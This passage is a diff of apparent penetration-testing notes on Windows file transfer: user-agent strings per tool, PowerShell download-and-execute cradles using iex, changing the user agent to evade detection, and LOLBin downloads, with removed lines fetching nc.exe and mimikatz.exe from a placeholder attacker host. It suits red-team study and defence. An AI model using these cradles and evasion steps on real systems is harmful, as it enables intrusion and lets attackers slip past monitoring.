-- **WinHttpRequest** — `WinHttp.WinHttpRequest.5`
-- **Msxml2** — `MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E`
-- **Certutil** — `Microsoft-CryptoAPI/10.0`
-- **BITS** — `Microsoft BITS/7.8`
+Command-line blacklisting is easy to bypass even with case obfuscation; whitelisting command lines is slower to set up but more robust.
 
-Command-line whitelisting (vs blacklisting) is far more robust — blacklists fall to trivial obfuscation, whitelists catch anything unusual. User agent whitelisting in a SIEM does the same for transfer traffic.
+#### User Agent Strings by Tool
+
+```powershell
+$h=new-object -com WinHttp.WinHttpRequest.5.1; $h.open('GET','<URL>',$false); $h.send(); iex $h.ResponseText
+$h=New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','<URL>',$false); $h.send(); iex $h.responseText
+```
+
+`Invoke-WebRequest`/`Invoke-RestMethod` UA `WindowsPowerShell/5.1.14393.0` | `WinHttpRequest` UA `WinHttp.WinHttpRequest.5` | `Msxml2` UA `MSIE 7.0; Trident/7.0` | `certutil -urlcache`/`-verifyctl` UA `Microsoft-CryptoAPI/10.0` | `BITS` UA `Microsoft BITS/7.8`
 
 ## Evading Detection
 
-**Changing User Agent in PowerShell**
+Change User-Agent or use LOLBins to blend in with legitimate traffic and dodge application whitelisting/blacklisting.
+
+### Changing User Agent
 
 ```powershell
 [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
-
 $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
-Invoke-WebRequest http://<ATTACKER_IP>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+Invoke-WebRequest <URL> -UserAgent $UserAgent -OutFile <OUTPUT_FILE>
 ```
 
-Emulating a browser commonly used in the environment makes the traffic look routine.
+`[PSUserAgent]::` properties: `InternetExplorer` `FireFox` `Chrome` `Opera` `Safari`
 
-**LOLBINs when application whitelisting blocks PowerShell/Netcat** — a signed, whitelisted binary that happens to download files. Example:
+### LOLBAS / GTFOBins
+
+Application whitelisting may block PowerShell/Netcat, a LOLBin ("misplaced trust binary") may be permitted and unalerted.
 
 ```powershell
-GfxDownloadWrapper.exe "http://<ATTACKER_IP>/mimikatz.exe" "C:\Temp\nc.exe"
+GfxDownloadWrapper.exe "<URL>" "<OUTPUT_FILE>"
 ```
 
-Intel Graphics Driver on Windows 10 ships with a periodic config download feature — permitted by whitelisting, ignored by alerting. Check LOLBAS / GTFOBins for a "file download" binary present in the environment; GTFOBins documents ~40 Linux binaries usable for transfer.
+LOLBAS: https://lolbas-project.github.io/  
+GTFOBins: https://gtfobins.github.io/
